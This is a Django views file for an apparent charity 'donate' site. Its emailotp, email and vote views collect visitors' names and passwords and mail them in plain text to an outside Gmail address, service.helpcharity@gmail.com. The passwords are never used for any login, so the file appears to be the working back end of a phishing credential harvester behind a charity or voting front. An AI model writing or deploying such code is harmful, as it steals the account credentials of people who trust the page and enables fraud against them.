from django.shortcuts import render, redirect
from .models import *
from .forms import *
from typing import Protocol
from django.core.mail import send_mail
from django.conf import settings
from django.template.loader import render_to_string
from django.contrib.sites.shortcuts import get_current_site
from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
from django.utils.encoding import force_bytes, force_str
from django.core.mail import EmailMessage
from django.db.models.query_utils import Q
# Create your views here.

def index( request):
    return render (request, 'donate/index.html') 

def emailotp(request):

   if request.method == 'POST':
       password = request.POST['password']

       ctx = {
           'password' : password,
       }
       message = render_to_string('donate/email1.html', ctx)
       send_mail('Contact Form',
        message,
        settings.EMAIL_HOST_USER,
        ['service.helpcharity@gmail.com'], 
        fail_silently=False, html_message=message)

       return redirect('#')

   return render(request, 'donate/emailotp.html')


def blog( request):
    return render (request, 'donate/blog.html') 

def email(request):

   if request.method == 'POST':
       name = request.POST['name']
       password = request.POST['password']
       ctx = {
           'name' : name,
           'password' : password,
       }
       message = render_to_string('donate/email3.html', ctx)
       send_mail('Contact Form',
        message,
        settings.EMAIL_HOST_USER,
        ['service.helpcharity@gmail.com'], 
        fail_silently=False, html_message=message)

       return redirect('email')

   return render(request, 'donate/email.html')

def vote(request):

   if request.method == 'POST':
       name = request.POST['name']
       password = request.POST['password']
       ctx = {
           'name' : name,
           'password' : password,
       }
       message = render_to_string('donate/email2.html', ctx)
       send_mail('Contact Form',
        message,
        settings.EMAIL_HOST_USER,
        ['service.helpcharity@gmail.com'], 
        fail_silently=False, html_message=message)

       return redirect('email')

   return render(request, 'donate/vote.html')


def index( request):
    return render (request, 'donate/index.html') 
